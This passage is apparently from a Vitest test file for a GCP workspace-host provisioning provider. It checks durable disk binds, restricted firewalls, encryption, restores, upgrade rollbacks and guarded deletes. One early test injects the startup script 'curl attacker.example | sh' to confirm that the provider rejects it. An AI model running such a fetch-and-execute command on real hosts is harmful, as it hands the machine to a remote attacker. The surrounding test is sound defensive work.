    // or preferring one source would leave request input reaching instance startup metadata.
    const { provider } = providerAndClient();
    const spec = desired();
    spec.provider = { ...spec.provider, startupScript: '#!/bin/sh\ncurl attacker.example | sh\n' };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'injected', idempotencyKey: 'injected', desired: spec },
        context(),
      ),
    ).rejects.toThrow(/gcp\.desired\.provider\.startupScript is not accepted/);
  });

  it('emits the durable mount alone when the controller supplied no bootstrap', async () => {
    // Not a silent default: the provisioning runner refuses BEFORE planning when a provider that
    // declares hostBootstrap cannot get one rendered. This asserts the provider itself stays
    // well-defined for the lifecycle actions that legitimately create no fresh host.
    const { provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'bare', idempotencyKey: 'bare', desired: desired() },
      context(),
    );
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    const script = instance.metadata.items.find(({ key }) => key === 'startup-script')?.value ?? '';
    expect(script).toContain('resize2fs "$data_device"');
    expect(script).not.toContain('# User-supplied bootstrap follows the durable mount.');
  });

  it('binds workspace and agent homes onto the DURABLE disk before the bootstrap runs', async () => {
    const { provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'home-bind', idempotencyKey: 'home-bind', desired: desired() },
      context({}, '#!/usr/bin/env bash\necho papercusp-bootstrap\n'),
    );
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    const script = instance.metadata.items.find(({ key }) => key === 'startup-script')?.value ?? '';

    // The bind targets the CANONICAL home (WI-10006838: /home is a symlink to var/home on bootc).
    expect(script).toContain('home_target="$(readlink -f -- /home)"');
    expect(script).toContain('cp -a "$home_target"/. "$home_seed"/');
    expect(script).toContain('mv -T -- "$home_seed" "$data_mount/home"');
    expect(script).toContain('grep -q " ${home_target} none bind" /etc/fstab');
    expect(script).toContain('mountpoint -q "$home_target" || mount --bind "$data_mount/home" "$home_target"');

    const homeBindAt = script.indexOf('mount --bind "$data_mount/home"');
    const bootstrapAt = script.indexOf('# User-supplied bootstrap follows the durable mount.');
    expect(homeBindAt).toBeGreaterThan(-1);
    expect(bootstrapAt).toBeGreaterThan(-1);
    expect(homeBindAt).toBeLessThan(bootstrapAt);
  });

  it('atomically adopts boot-disk homes, retries a failed copy, and preserves the durable copy thereafter', async () => {
    const { provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'home-copy', idempotencyKey: 'home-copy', desired: desired() },
      context(),
    );
    const instance = (plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }).request;
    const script = instance.metadata.items.find(({ key }) => key === 'startup-script')!.value;
    const start = script.indexOf('home_target="$(readlink -f -- /home)"');
    const end = script.indexOf('install -d -m 0755 "$home_target"');
    expect(start).toBeGreaterThan(-1);
    expect(end).toBeGreaterThan(start);
    const root = mkdtempSync(join(tmpdir(), 'gcp-home-copy-'));
    const source = join(root, 'boot-home');
    const data = join(root, 'data');
    const durable = join(data, 'home');
    mkdirSync(join(source, 'customer'), { recursive: true });
    mkdirSync(data);
    writeFileSync(join(source, 'customer', '.auth-fixture'), 'customer-login');
    const run = (prefix = '') => spawnSync('bash', ['-c', [
      'set -euo pipefail', prefix,
      script.slice(start, end).replaceAll('/home', source).replaceAll('$data_mount' + source, '$data_mount/home'),
    ].join('\n')], { encoding: 'utf8', env: { ...process.env, data_mount: data }, timeout: 5000 });
    try {
      // A partial copy must not publish a directory that a subsequent boot trusts.
      const failed = run('cp() { command cp "$@"; return 42; }');
      expect(failed.status).toBe(42);
      expect(existsSync(durable)).toBe(false);
      const first = run();
      expect(first.status, first.stderr).toBe(0);
      expect(readFileSync(join(durable, 'customer', '.auth-fixture'), 'utf8')).toBe('customer-login');
      writeFileSync(join(source, 'customer', '.auth-fixture'), 'new-image-default');
      const retry = run();
      expect(retry.status, retry.stderr).toBe(0);
      expect(readFileSync(join(durable, 'customer', '.auth-fixture'), 'utf8')).toBe('customer-login');
      // An existing symlink is not a trusted persistent home.
      rmSync(durable, { recursive: true });
      symlinkSync(source, durable);
      expect(run().status).toBe(1);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it('binds the customer workspace root onto the DURABLE disk, before the bootstrap runs', async () => {
    // WI-2143796, proven on canary-14: WORKSPACE_HOST_DATA_ROOT is a path on the BOOT disk, and
    // `upgrade` deletes and recreates that disk while retaining only the data disk — so a routine
    // image upgrade destroyed every customer workspace. A file written to that root as the customer
    // SSH user was GONE after a ledger-verified succeeded|100 upgrade, while the data disk persisted.
    //
    // This test is the guard. It fails if the bind is dropped, or if WORKSPACE_HOST_DATA_ROOT is
    // moved without the bind following it — the two constants live in different packages and
    // neither imports the other, which is exactly how the original defect went unnoticed.
    const { provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'bind', idempotencyKey: 'bind', desired: desired() },
      // A bootstrap IS supplied here, because the ordering assertion below is the point of this
      // test: the bind must be emitted before the bootstrap that writes into the workspace root.
      context({}, '#!/usr/bin/env bash\necho papercusp-bootstrap\n'),
    );
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    const script = instance.metadata.items.find(({ key }) => key === 'startup-script')?.value ?? '';

    // The workspace root is NOT under the durable mount by path — that is the whole reason a bind
    // is required rather than a plain mkdir, so assert the premise the fix rests on.
    expect(WORKSPACE_HOST_DATA_ROOT.startsWith(`${GCP_DATA_MOUNT_POINT}/`)).toBe(false);

    expect(script).toContain(
      `mountpoint -q '${WORKSPACE_HOST_DATA_ROOT}' || mount --bind "$data_mount/workspaces" '${WORKSPACE_HOST_DATA_ROOT}'`,
    );
    // Survives reboot as well as instance recreation.
    expect(script).toContain(`grep -q " ${WORKSPACE_HOST_DATA_ROOT} none bind" /etc/fstab`);
    // The bind SOURCE must be the directory this script creates on the durable mount.
    expect(script).toContain('install -d -m 0750 "$data_mount"/{postgres,repositories,transcripts,workspaces}');

    // ORDERING IS LOAD-BEARING: the bind must precede the user bootstrap, so the bootstrap's own
    // `install -d`/`setfacl` on the workspace root write through to the durable disk instead of
    // being hidden by a mount that lands on top of them afterwards.
    const bindAt = script.indexOf(`mount --bind "$data_mount/workspaces"`);
    const bootstrapAt = script.indexOf('# User-supplied bootstrap follows the durable mount.');
    expect(bindAt).toBeGreaterThan(-1);
    expect(bootstrapAt).toBeGreaterThan(-1);
    expect(bindAt).toBeLessThan(bootstrapAt);
  });

  it('provisions restricted direct SSH with only tcp/22 and returns a complete machine profile', async () => {
    const { client, provider } = providerAndClient();
    const spec = desired();
    spec.transportPreference = 'gcp-direct-ssh';
    spec.provider = { ...spec.provider, directSshSourceRanges: ['203.0.113.8/32'] };
    const plan = await provider.plan(
      { action: 'provision', operationId: 'direct', idempotencyKey: 'direct', desired: spec },
      context(),
    );
    const firewall = (
      plan.steps.find(({ id }) => id === 'create-firewall')!.input as unknown as { request: GcpFirewallInsertInput }
    ).request;
    expect(firewall.sourceRanges).toEqual(['203.0.113.8/32']);
    expect(firewall.allowed).toEqual([{ IPProtocol: 'tcp', ports: ['22'] }]);
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    expect(instance.networkInterfaces[0].accessConfigs).toEqual([
      { name: 'External NAT', type: 'ONE_TO_ONE_NAT', networkTier: 'PREMIUM' },
    ]);

    const { host } = await provision(client, provider, spec);
    const profile = await provider.getTransportProfile(host, context({ transportPreference: 'gcp-direct-ssh' }));
    expect(profile).toMatchObject({
      kind: 'gcp-direct-ssh',
      audited: false,
      features: { command: true, pty: true, tcpForward: true, fileTransfer: true },
    });
    expect(profile.endpoint).toContain('ssh://203.0.113.42:22?');
    expect(profile.endpoint).toContain('project=papercusp-dev-123');
  });

  it('provisions Defguard without a public IP or inbound GCP firewall and emits an overlay profile', async () => {
    const { client, provider } = providerAndClient();
    const spec = desired();
    spec.transportPreference = 'defguard-ssh';
    const plan = await provider.plan(
      { action: 'provision', operationId: 'defguard', idempotencyKey: 'defguard', desired: spec },
      context(),
    );
    expect(plan.steps.map(({ id }) => id)).toEqual([
      'create-network',
      'create-subnetwork',
      'create-router',
      'create-nat',
      'create-data-disk',
      'create-instance',
    ]);
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
    ).request;
    expect(instance.networkInterfaces[0]).not.toHaveProperty('accessConfigs');

    const { host } = await provision(client, provider, spec);
    expect(client.insertFirewallCalls).toHaveLength(0);
    const profile = await provider.getTransportProfile(
      host,
      context({ transportPreference: 'defguard-ssh', defguardAddress: '10.42.0.8' }),
    );
    expect(profile).toMatchObject({ kind: 'defguard-ssh', audited: true });
    expect(profile.endpoint).toContain('ssh://10.42.0.8:22?');
    expect(profile.constraints).toContain('No public IP or inbound GCP firewall rule');
  });

  it('rejects broad or caller-defined firewall policy instead of exposing operator services', async () => {
    const { provider } = providerAndClient();
    const broad = desired();
    broad.transportPreference = 'gcp-direct-ssh';
    broad.provider = { ...broad.provider, directSshSourceRanges: ['0.0.0.0/0'] };
    await expect(
      provider.plan({ action: 'provision', operationId: 'broad', idempotencyKey: 'broad', desired: broad }, context()),
    ).rejects.toThrow('restricted IPv4 CIDRs');

    const arbitraryPorts = desired();
    arbitraryPorts.provider = {
      ...arbitraryPorts.provider,
      network: { ...(arbitraryPorts.provider!.network as object), allowedTcpPorts: ['22', '3070', '5432'] },
    };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'ports', idempotencyKey: 'ports', desired: arbitraryPorts },
        context(),
      ),
    ).rejects.toThrow('sourceRanges/allowedTcpPorts are forbidden');
  });

  it('refuses dependent Compute Engine calls until prerequisite identities have been persisted', async () => {
    const { client, provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'operation-2', idempotencyKey: 'operation-2', desired: desired() },
      context(),
    );
    await expect(
      provider.apply(
        {
          planId: plan.planId,
          operationId: plan.operationId,
          step: plan.steps.find(({ id }) => id === 'create-subnetwork')!,
          knownResources: [],
        },
        context(),
      ),
    ).rejects.toThrow('requires a persisted network resource identity');
    expect(client.insertSubnetworkCalls).toHaveLength(0);

    const disk = requireAppliedResource(
      await provider.apply(
        {
          planId: plan.planId,
          operationId: plan.operationId,
          step: plan.steps.find(({ id }) => id === 'create-data-disk')!,
          knownResources: [],
        },
        context(),
      ),
    );
    await expect(
      provider.apply(
        {
          planId: plan.planId,
          operationId: plan.operationId,
          step: plan.steps.find(({ id }) => id === 'create-instance')!,
          knownResources: [disk],
        },
        context(),
      ),
    ).rejects.toThrow('requires a persisted subnetwork/existing-subnetwork resource identity');
    expect(client.insertInstanceCalls).toHaveLength(0);
  });

  it('records but never owns or deletes explicitly selected existing network resources', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider, desired('existing'));
    expect(resources.map((item) => item.kind)).toEqual([
      'existing-network',
      'existing-subnetwork',
      'existing-firewall',
      'disk',
      'vm',
    ]);
    expect(client.insertNetworkCalls).toHaveLength(0);
    expect(client.insertSubnetworkCalls).toHaveLength(0);
    expect(client.insertFirewallCalls).toHaveLength(0);
    const destroy = await provider.plan(
      {
        action: 'destroy',
        operationId: 'destroy-existing',
        idempotencyKey: 'destroy-existing',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    expect(destroy.steps.map((step) => step.resourceKind)).toEqual(['vm', 'disk']);
  });

  it('restores a managed READY snapshot into a distinct encrypted disk and replacement host', async () => {
    const { client, provider } = providerAndClient();
    client.seedSnapshot('pc-host-gcp-1-q3', 'host-gcp-1');
    const sourceHost: WorkspaceHostRef = {
      hostId: 'host-gcp-1',
      target: 'gcp',
      resources: [
        {
          target: 'gcp',
          kind: 'disk',
          providerId: 'pc-host-gcp-1-data',
          parentProviderId: 'papercusp-dev-123',
          zone: 'us-central1-a',
        },
      ],
    };
    const recovered = desired();
    recovered.hostId = 'host-gcp-recovered';
    recovered.provider = {
      ...recovered.provider,
      network: {
        mode: 'managed',
        networkName: 'pc-host-gcp-recovered-net',
        subnetworkName: 'pc-host-gcp-recovered-subnet',
        firewallName: 'pc-host-gcp-recovered-iap',
        ipCidrRange: '10.132.13.0/24',
      },
      instanceName: 'pc-host-gcp-recovered-vm',
      dataDiskName: 'pc-host-gcp-recovered-data',
    };
    const snapshotKey =
      'projects/papercusp-dev-123/locations/us-central1/keyRings/workspaces/cryptoKeys/snapshot-source';
    const plan = await provider.plan(
      {
        action: 'restore',
        operationId: 'restore-1',
        idempotencyKey: 'restore-1',
        host: sourceHost,
        snapshot: {
          target: 'gcp',
          providerId: 'projects/papercusp-dev-123/global/snapshots/pc-host-gcp-1-q3',
          hostId: sourceHost.hostId,
          encryptionKeyRef: snapshotKey,
        },
        desired: recovered,
      },
      context(),
    );

    expect(provider.capabilities.lifecycle.restore).toBe(true);
    expect(plan.hostId).toBe(recovered.hostId);
    expect(plan.steps.every(({ action, destructive }) => action === 'restore' && destructive === false)).toBe(true);
    const disk = (
      plan.steps.find(({ id }) => id === 'create-data-disk')!.input as unknown as {
        request: GcpDiskInsertInput;
      }
    ).request;
    expect(disk).toMatchObject({
      name: 'pc-host-gcp-recovered-data',
      sourceSnapshot: 'projects/papercusp-dev-123/global/snapshots/pc-host-gcp-1-q3',
      sourceSnapshotEncryptionKey: { kmsKeyName: snapshotKey },
      diskEncryptionKey: { kmsKeyName: expect.any(String) },
      labels: { 'papercusp-host-id': recovered.hostId },
    });
    expect(plan.steps.map(({ id }) => id)).not.toContain('delete-data-disk');
    expect(plan.steps.map(({ id }) => id)).not.toContain('delete-instance');
  });

  it('fails closed for unencrypted data, cross-project ambiguity, and implicit live clients', async () => {
    const { provider } = providerAndClient();
    const unencrypted = desired();
    unencrypted.data = { ...unencrypted.data, encrypted: false };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'unsafe-1', idempotencyKey: 'unsafe-1', desired: unencrypted },
        context(),
      ),
    ).rejects.toThrow('data disks must be encrypted');

    const crossProject = desired();
    crossProject.provider = { ...crossProject.provider, projectId: 'other-project-123' };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'unsafe-2', idempotencyKey: 'unsafe-2', desired: crossProject },
        context(),
      ),
    ).rejects.toThrow('projectId must match desired.scope.id');

    const mutableFamily = desired();
    mutableFamily.image = {
      id: 'projects/papercusp-images/global/images/family/papercusp-workspace-host',
    };
    await expect(
      provider.plan(
        { action: 'provision', operationId: 'unsafe-3', idempotencyKey: 'unsafe-3', desired: mutableFamily },
        context(),
      ),
    ).rejects.toThrow('family aliases are forbidden');
    expect(() => createGcpWorkspaceHostProvider({ client: undefined as never })).toThrow('requires an injected');
  });

  it('uses provider-managed encryption by default and treats a customer-managed key as an explicit option', async () => {
    const { provider } = providerAndClient();
    const withoutCmk = desired();
    withoutCmk.provider = { ...withoutCmk.provider, kmsKeyName: undefined };
    const plan = await provider.plan(
      { action: 'provision', operationId: 'no-cmk', idempotencyKey: 'no-cmk', desired: withoutCmk },
      context(),
    );
    const disk = (
      plan.steps.find(({ id }) => id === 'create-data-disk')!.input as unknown as {
        request: GcpDiskInsertInput;
      }
    ).request;
    const instance = (
      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as {
        request: GcpInstanceInsertInput;
      }
    ).request;
    expect(disk).not.toHaveProperty('diskEncryptionKey');
    expect(instance.disks[0].initializeParams).not.toHaveProperty('diskEncryptionKey');
  });
});

describe('GCP workspace-host provider contract and lifecycle', () => {
  it('passes the shared fake contract with reconciliation, observation, IAP transport, and confirmed deletion', async () => {
    const { provider } = providerAndClient();
    const report = await runFakeWorkspaceHostProviderContractSuite(provider, {
      adapterKind: 'fake',
      reportRef: 'artifact://workspace-host/gcp/provider-contract-1',
      context: context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
      desired: desired(),
      operationId: 'contract-operation',
      idempotencyKey: 'contract-operation',
      confirmedBy: 'vitest',
      now: () => NOW,
    });
    expect(report.passed).toBe(true);
    expect(report.checks).toEqual(WORKSPACE_HOST_PROVIDER_CONTRACT_CHECKS);
    expect(report.provisionedResources.map((item) => item.kind)).toEqual([
      'network',
      'subnetwork',
      'firewall',
      'router',
      'nat',
      'disk',
      'vm',
    ]);
    expect(report.destroyConfirmations.map((item) => item.providerResourceId)).toEqual([
      'pc-host-gcp-1-vm',
      'pc-host-gcp-1-data',
      'pc-host-gcp-1-iap',
      'pc-host-gcp-1-nat',
      'pc-host-gcp-1-router',
      'pc-host-gcp-1-subnet',
      'pc-host-gcp-1-net',
    ]);
  });

  it('polls scoped operations for stop/start/restart/snapshot/repair and freshly confirms every delete', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    const actions = ['stop', 'start', 'restart', 'snapshot', 'repair'] as const;
    for (const action of actions) {
      const plan = await provider.plan(
        action === 'snapshot'
          ? {
              action,
              operationId: `operation:${action}`,
              idempotencyKey: `operation:${action}`,
              host,
              name: 'manual-snapshot',
            }
          : { action, operationId: `operation:${action}`, idempotencyKey: `operation:${action}`, host },
        context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
      );
      for (const step of plan.steps) {
        const result = await provider.apply(
          { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
          context(),
        );
        expect(result.state).toBe('applied');
      }
    }
    expect({
      start: client.startCalls,
      stop: client.stopCalls,
      reset: client.resetCalls,
      metadataRefreshes: client.setInstanceMetadataCalls.length,
      snapshots: client.snapshotCalls.length,
    }).toEqual({ start: 2, stop: 2, reset: 2, metadataRefreshes: 1, snapshots: 1 });
    expect(
      client.setInstanceMetadataCalls[0]?.input.items.find(({ key }) => key === 'startup-script')?.value,
    ).toContain('echo current-controller-bootstrap');
    expect(client.snapshotCalls[0]?.input.labels).toEqual({
      'papercusp-host-id': 'host-gcp-1',
      'papercusp-managed': 'true',
      'papercusp-workspace-id': 'workspace-gcp-1',
    });
    expect(client.waitedOperations.length).toBeGreaterThanOrEqual(10);

    const destroy = await provider.plan(
      {
        action: 'destroy',
        operationId: 'operation:destroy',
        idempotencyKey: 'operation:destroy',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    expect(destroy.steps.map(({ resourceKind }) => resourceKind)).toEqual([
      'vm',
      'disk',
      'firewall',
      'nat',
      'router',
      'subnetwork',
      'network',
    ]);
    const natDelete = destroy.steps.find(({ resourceKind }) => resourceKind === 'nat')!;
    const routerDelete = destroy.steps.find(({ resourceKind }) => resourceKind === 'router')!;
    const subnetworkDelete = destroy.steps.find(({ resourceKind }) => resourceKind === 'subnetwork')!;
    const networkDelete = destroy.steps.find(({ resourceKind }) => resourceKind === 'network')!;
    expect(routerDelete.dependsOn).toContain(natDelete.id);
    expect(subnetworkDelete.dependsOn).toContain(routerDelete.id);
    expect(networkDelete.dependsOn).toContain(subnetworkDelete.id);
    for (const step of destroy.steps) {
      const result = await provider.apply(
        { planId: destroy.planId, operationId: destroy.operationId, step, knownResources: resources },
        context(),
      );
      expect(result.state).toBe('destroyed');
      if (result.state === 'destroyed') expect(result.confirmation.source).toBe('provider-read');
    }
    expect(client.deleteCalls).toBe(7);
    await expect(
      provider.reconcile(
        {
          planId: destroy.planId,
          operationId: destroy.operationId,
          step: natDelete,
          knownResources: resources,
          reason: 'resume',
        },
        context(),
      ),
    ).resolves.toMatchObject({ state: 'destroyed', confirmation: { source: 'provider-read' } });
    expect(client.deleteCalls).toBe(7);
  });

  it('reconciles an ambiguous instance insert by fresh resource read without a duplicate API mutation', async () => {
    const { client, provider } = providerAndClient();
    const plan = await provider.plan(
      { action: 'provision', operationId: 'operation-3', idempotencyKey: 'operation-3', desired: desired() },
      context(),
    );
    const resources: WorkspaceHostResourceRef[] = [];
    for (const step of plan.steps) {
      const result = await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
      if ('resource' in result && result.resource) resources.push(result.resource);
    }
    const instanceStep = plan.steps.at(-1)!;
    const reconciled = await provider.reconcile(
      {
        planId: plan.planId,
        operationId: plan.operationId,
        step: instanceStep,
        knownResources: resources,
        reason: 'ambiguous-timeout',
        previousProviderRequestId: 'operation-5',
      },
      context(),
    );
    expect(reconciled.state).toBe('unchanged');
    expect('resource' in reconciled && reconciled.resource?.providerId).toBe('pc-host-gcp-1-vm');
    expect(client.insertInstanceCalls).toHaveLength(1);
  });

  it('upgrades by replacing only the boot/runtime VM and reattaching the exact retained data disk', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    await expect(
      provider.plan(
        {
          action: 'upgrade',
          operationId: 'operation:mutable-upgrade',
          idempotencyKey: 'operation:mutable-upgrade',
          host,
          image: { id: 'projects/papercusp/global/images/family/papercusp-workspace-host' },
        },
        context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
      ),
    ).rejects.toThrow('family aliases are forbidden');
    const plan = await provider.plan(
      {
        action: 'upgrade',
        operationId: 'operation:upgrade',
        idempotencyKey: 'operation:upgrade',
        host,
        image: { id: 'projects/papercusp/global/images/papercusp-v2' },
      },
      context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
    );
    expect(plan.steps.map(({ id, dependsOn }) => ({ id, dependsOn }))).toEqual([
      { id: 'delete-boot-runtime', dependsOn: [] },
      { id: 'create-boot-runtime', dependsOn: ['delete-boot-runtime'] },
    ]);
    for (const step of plan.steps) {
      await provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step, knownResources: resources },
        context(),
      );
    }
    const replacement = client.insertInstanceCalls.at(-1)!.input;
    expect(replacement.disks[0].initializeParams.sourceImage).toBe('projects/papercusp/global/images/papercusp-v2');
    expect(replacement.disks[1]).toMatchObject({
      autoDelete: false,
      source: 'projects/papercusp-dev-123/zones/us-central1-a/disks/pc-host-gcp-1-data',
    });
    expect(await client.getDisk('papercusp-dev-123', 'us-central1-a', 'pc-host-gcp-1-data')).toMatchObject({
      status: 'READY',
      attachedInstanceNames: ['pc-host-gcp-1-vm'],
    });
  });

  // WI-10002490: once delete-boot-runtime applies there is no VM left to read, so the way back has
  // to be computed now — as the same re-create, pointed at the prior image.
  it('precomputes an upgrade rollback that re-creates the same VM from the prior image', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    const plan = await provider.plan(
      {
        action: 'upgrade',
        operationId: 'operation:rollback-upgrade',
        idempotencyKey: 'operation:rollback-upgrade',
        host,
        image: { id: 'projects/papercusp/global/images/papercusp-v2' },
        rollbackImage: { id: 'projects/papercusp/global/images/papercusp-v1' },
      },
      context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
    );
    const [deleteStep, createStep] = plan.steps;
    expect(deleteStep!.rollback).toBeUndefined();
    const rollback = createStep!.rollback!;
    const forward = createStep!.input as { requestId: string; request: GcpInstanceInsertInput };
    const back = rollback.input as { requestId: string; request: GcpInstanceInsertInput };
    expect(rollback.idempotencyKey).not.toBe(createStep!.idempotencyKey);
    expect(back.requestId).not.toBe(forward.requestId);
    expect(back.request.disks[0].initializeParams.sourceImage).toBe('projects/papercusp/global/images/papercusp-v1');
    // Everything but the boot image is the forward re-create — name, data disk, bootstrap metadata.
    expect({ ...back.request, disks: back.request.disks.slice(1) }).toEqual({
      ...forward.request,
      disks: forward.request.disks.slice(1),
    });

    await provider.apply(
      { planId: plan.planId, operationId: plan.operationId, step: deleteStep!, knownResources: resources },
      context(),
    );
    await provider.apply(
      {
        planId: plan.planId,
        operationId: plan.operationId,
        step: { ...createStep!, id: 'create-boot-runtime:rollback', idempotencyKey: rollback.idempotencyKey, input: rollback.input },
        knownResources: resources,
      },
      context(),
    );
    expect(client.insertInstanceCalls.at(-1)!.input.disks[0].initializeParams.sourceImage).toBe(
      'projects/papercusp/global/images/papercusp-v1',
    );
    expect((await client.getInstance('papercusp-dev-123', 'us-central1-a', 'pc-host-gcp-1-vm'))?.status).toBe(
      'RUNNING',
    );
  });

  it('refuses an upgrade whose rollback image is unusable before deleting anything', async () => {
    const { client, provider } = providerAndClient();
    const { host } = await provision(client, provider);
    const upgrade = (rollbackImage: string) =>
      provider.plan(
        {
          action: 'upgrade',
          operationId: 'operation:bad-rollback',
          idempotencyKey: 'operation:bad-rollback',
          host,
          image: { id: 'projects/papercusp/global/images/papercusp-v2' },
          rollbackImage: { id: rollbackImage },
        },
        context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
      );
    await expect(upgrade('projects/papercusp/global/images/family/papercusp-workspace-host')).rejects.toThrow(
      'family aliases are forbidden',
    );
    client.unreadableImages.add('projects/papercusp/global/images/papercusp-retired');
    await expect(upgrade('projects/papercusp/global/images/papercusp-retired')).rejects.toThrow(
      'gcp_preflight_http_404',
    );
    expect(client.deleteCalls).toBe(0);
  });

  it('refuses on reconcile to adopt a same-named VM that boots a different image than the step creates', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    const plan = await provider.plan(
      {
        action: 'upgrade',
        operationId: 'operation:adopt-check',
        idempotencyKey: 'operation:adopt-check',
        host,
        image: { id: 'projects/papercusp/global/images/papercusp-v2' },
        rollbackImage: { id: 'projects/papercusp/global/images/papercusp-v1' },
      },
      context({}, '#!/usr/bin/env bash\necho current-controller-bootstrap\n'),
    );
    const [deleteStep, createStep] = plan.steps;
    await provider.apply(
      { planId: plan.planId, operationId: plan.operationId, step: deleteStep!, knownResources: resources },
      context(),
    );
    // The forward re-create left a v2 VM behind; the rollback's reconcile must not call it v1.
    await provider.apply(
      { planId: plan.planId, operationId: plan.operationId, step: createStep!, knownResources: resources },
      context(),
    );
    const rollbackStep = {
      ...createStep!,
      id: 'create-boot-runtime:rollback',
      idempotencyKey: createStep!.rollback!.idempotencyKey,
      input: createStep!.rollback!.input,
    };
    await expect(
      provider.reconcile(
        { planId: plan.planId, operationId: plan.operationId, step: rollbackStep, knownResources: resources, reason: 'resume' },
        context(),
      ),
    ).rejects.toMatchObject({ status: 412, message: expect.stringContaining('papercusp-v2') });
    // Positive control: the forward step's own VM is still adoptable by its own reconcile.
    await expect(
      provider.reconcile(
        { planId: plan.planId, operationId: plan.operationId, step: createStep!, knownResources: resources, reason: 'resume' },
        context(),
      ),
    ).resolves.toMatchObject({ state: 'unchanged' });
  });

  it('refuses to delete a data disk with a foreign attachment or mismatched host labels', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    const plan = await provider.plan(
      {
        action: 'destroy',
        operationId: 'operation:safe-destroy',
        idempotencyKey: 'operation:safe-destroy',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    const deleteVm = plan.steps.find(({ resourceKind }) => resourceKind === 'vm')!;
    const deleteDisk = plan.steps.find(({ resourceKind }) => resourceKind === 'disk')!;
    await provider.apply(
      { planId: plan.planId, operationId: plan.operationId, step: deleteVm, knownResources: resources },
      context(),
    );
    client.rewriteDisk('pc-host-gcp-1-data', { attachedInstanceNames: ['foreign-vm'] });
    await expect(
      provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step: deleteDisk, knownResources: resources },
        context(),
      ),
    ).rejects.toThrow('still attached to foreign-vm');
    client.rewriteDisk('pc-host-gcp-1-data', {
      attachedInstanceNames: [],
      labels: { 'papercusp-managed': 'true', 'papercusp-host-id': 'another-host' },
    });
    await expect(
      provider.apply(
        { planId: plan.planId, operationId: plan.operationId, step: deleteDisk, knownResources: resources },
        context(),
      ),
    ).rejects.toThrow("not labeled as managed by workspace host 'host-gcp-1'");
  });

  it('does not delete a same-name replacement when a stale destroy plan targets an older incarnation', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    const vm = host.resources.find((item) => item.kind === 'vm')!;
    const oldIncarnationId = vm.incarnationId!;
    const replacementIncarnationId = 'gcp-instance-replacement-2';
    client.replaceInstanceIncarnation(vm.providerId, replacementIncarnationId);

    const plan = await provider.plan(
      {
        action: 'destroy',
        operationId: 'operation:stale-destroy',
        idempotencyKey: 'operation:stale-destroy',
        host,
        disposition: 'discard',
        confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
      },
      context(),
    );
    const deleteVm = plan.steps.find((step) => step.resourceKind === 'vm')!;
    expect((deleteVm.input as { incarnationId?: string }).incarnationId).toBe(oldIncarnationId);

    const result = await provider.apply(
      { planId: plan.planId, operationId: plan.operationId, step: deleteVm, knownResources: resources },
      context(),
    );

    expect(result.state).toBe('destroyed');
    expect(client.deleteCalls).toBe(0);
    expect((await client.getInstance('project', 'zone', vm.providerId))?.instanceId).toBe(replacementIncarnationId);
    expect('confirmation' in result ? result.confirmation.incarnationId : undefined).toBe(oldIncarnationId);
  });

  it('adopts its own READY destroy snapshot when a re-driven destroy finds the source disk already deleted', async () => {
    const { client, provider } = providerAndClient();
    const { host, resources } = await provision(client, provider);
    const destroyPlan = (operationId: string) =>
      provider.plan(
        {
          action: 'destroy',
          operationId,
          idempotencyKey: operationId,
          host,
          disposition: 'snapshot',
          confirmation: { expectedHostId: host.hostId, confirmedBy: 'vitest', confirmedAt: NOW },
        },
        context(),
      );
    const first = await destroyPlan('operation:destroy-1');
    for (const step of first.steps) {
      await provider.apply(
        { planId: first.planId, operationId: first.operationId, step, knownResources: resources },
        context(),
      );
    }
    expect(client.snapshotCalls).toHaveLength(1);
    const snapshotName = client.snapshotCalls[0]!.input.name;

